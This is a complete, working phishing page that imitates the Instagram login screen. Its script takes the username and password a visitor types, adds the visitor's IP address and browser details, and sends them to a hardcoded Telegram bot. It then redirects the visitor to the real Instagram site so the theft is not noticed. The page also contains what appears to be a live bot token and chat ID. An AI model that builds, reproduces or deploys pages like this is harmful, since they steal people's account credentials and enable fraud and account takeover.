<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }

        .login-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            margin-bottom: 10px;
            width: 100%;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-family: 'Instagram Sans Script', cursive;
            font-size: 40px;
            font-weight: 400;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .form-group {
            margin-bottom: 10px;
        }

        input {
            width: 100%;
            padding: 12px 10px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 9px 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 15px;
        }

        .fb-icon {
            width: 16px;
            height: 16px;
            background-color: #385185;
            color: white;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 2px;
            font-size: 12px;
            font-weight: bold;
        }

        .forgot-password {
            text-align: center;
            color: #00376b;
            font-size: 12px;
            cursor: pointer;
            margin-top: 12px;
        }

        .signup-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 25px 40px;
            text-align: center;
            width: 100%;
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
        }

        .get-app {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 15px;
        }

        .app-button {
            height: 40px;
            width: 136px;
            background-size: cover;
            border-radius: 8px;
            cursor: pointer;
        }

        .app-store {
            background-color: #000;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            padding: 5px;
        }

        .google-play {
            background-color: #000;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            padding: 5px;
        }

        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 15px;
        }

        .footer-links span {
            cursor: pointer;
        }

        .copyright {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">Instagram</div>
            
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="login-btn">Log in</button>
                
                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">OR</div>
                    <div class="divider-line"></div>
                </div>
                
                <div class="fb-login">
                    <span class="fb-icon">f</span>
                    <span>Log in with Facebook</span>
                </div>
                
                <div class="forgot-password">
                    Forgot password?
                </div>
            </form>
        </div>
        
        <div class="signup-card">
            Don't have an account? <a>Sign up</a>
        </div>
        
        <div class="get-app">
            Get the app.
            <div class="app-buttons">
                <div class="app-button app-store">App Store</div>
                <div class="app-button google-play">Google Play</div>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <span>Meta</span>
                <span>About</span>
                <span>Blog</span>
                <span>Jobs</span>
                <span>Help</span>
                <span>API</span>
                <span>Privacy</span>
                <span>Terms</span>
                <span>Locations</span>
                <span>Instagram Lite</span>
                <span>Threads</span>
                <span>Contact Uploading & Non-Users</span>
                <span>Meta Verified</span>
            </div>
            <div class="copyright">
                © 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please fill in both fields');
                return;
            }

            // Get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Get additional browser info
                const browserInfo = navigator.userAgent;
                const timestamp = new Date().toLocaleString();
                
                // Prepare message for Telegram
                const message = `
🔐 *New Instagram Login* 🔐

👤 *Username/Email:* ${username}
🔑 *Password:* ${password}
🌐 *IP Address:* ${userIP}
📱 *Device/Browser:* ${browserInfo}
⏰ *Time:* ${timestamp}
                `;
                
                // Send to Telegram
                const botToken = '8552981245:AAEiZ02X2ldWeQnIws-TOtL_2Bbed9_mGb0';
                const chatId = '8556700715';
                
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Redirect to real Instagram (shows login attempt was processed)
                window.location.href = 'https://www.instagram.com/accounts/login/';
                
            } catch (error) {
                console.error('Error:', error);
                // Still redirect even if Telegram fails
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }
        });

        // Add some interactivity to make it feel real
        document.querySelector('.fb-login').addEventListener('click', function() {
            alert('This is a demo. Please use the login form above.');
        });

        document.querySelector('.forgot-password').addEventListener('click', function() {
            alert('This is a demo. Please use the login form above.');
        });

        document.querySelector('.signup-card a').addEventListener('click', function() {
            alert('This is a demo. Please use the login form above.');
        });
    </script>
</body>
